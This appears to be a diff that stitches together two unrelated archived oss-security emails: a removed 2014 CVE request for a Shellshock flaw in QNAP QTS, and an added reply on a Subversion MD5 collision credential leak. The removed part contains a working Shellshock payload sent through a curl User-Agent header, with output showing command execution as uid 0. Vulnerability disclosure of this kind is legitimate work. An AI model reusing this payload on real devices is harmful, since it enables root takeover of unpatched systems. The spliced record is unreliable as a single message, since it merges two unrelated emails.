@@ -1,35 +1,31 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/09/29/4
-Message-ID: <CAHV+4jd6hZ4nwYwtm4gkn1p0_4HD0C5T_2szOvQY8j2gLAkOgA@mail.gmail.com>
-Date: Mon, 29 Sep 2014 09:49:42 +0800
-From: Ken Lee <echain.tw@...il.com>
-To: cve-assign@...re.org
-Cc: oss-security@...ts.openwall.com
-Subject: CVE request: QNAP QTS
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/08/05/1
+Message-ID: <53E009ED.30704@reser.org>
+Date: Mon, 04 Aug 2014 15:32:13 -0700
+From: Ben Reser <ben@...er.org>
+To: Tomas Hoger <thoger@...hat.com>
+CC: Marcus Meissner <meissner@...e.de>,  OSS Security List <oss-security@...ts.openwall.com>
+Subject: Re: Re: Possible CVE request: subversion MD5 collision authentication leak
 Content-Type: text/plain; charset=utf-8
 
-Hello,
+On 8/4/14 12:38 PM, Tomas Hoger wrote:
+> I believe the attack here is supposed to create a collision against MD5
+> sums used as names of files under ~/.subversion/auth/svn.simple/.
+> However, as attacker does not control realm strings for any of the
+> trusted repositories, that would require preimage attack.  The lack of
+> (publicly) known efficient preimage attacks against MD5 should imply
+> such attack is still only theoretical.
 
-QNAP QTS [1] employ Bash as the default shell and we discover an arbitrary
-code execution flaw with UID=0 via `Web administration'.
-The PoC is shown as below:
+I think your understanding of the current state of MD5 collision attacks is out
+of date.  Chosen prefix attacks are possible.  See:
+http://www.win.tue.nl/hashclash/ChosenPrefixCollisions/
 
-> $ curl -A '() { :;}; echo Content-Type: text/html; echo; echo
-> `/usr/bin/id`' http://QNAP_QTS:8080/cgi-bin/restore_config.cgi
-> *uid=0(admin) gid=0(administrators)*
-> HTTP/1.1 200 OK
->
+The MD5 hash is created off the data in the following format:
+<$URL> $REALM
 
+An attacker trying to take advantage of this only needs the $URL portion to
+match their server.  The $REALM can then be whatever data is required to make
+the MD5 hash match the system they are trying to attack.
 
-{ "authPassed": 1, "Result": 0 }
-
-
-This issue has been acknowledged [2] by QNAP and if not assigned yet,
-please help to arrange a CVE identifier for this issue.
-Thank you, and have a nice day.
-
-
-Reference:
-[1] http://www.qnap.com.tw/i/en/qts4
-[2] http://www.qnap.com/useng/index.php?lang=en-us&sn=885&c=3036&sc=&n=22457
-
+I know of nobody that has taken the time to generate a MD5 collision to take
+advantage of this.  But I'm pretty sure that it could be done.
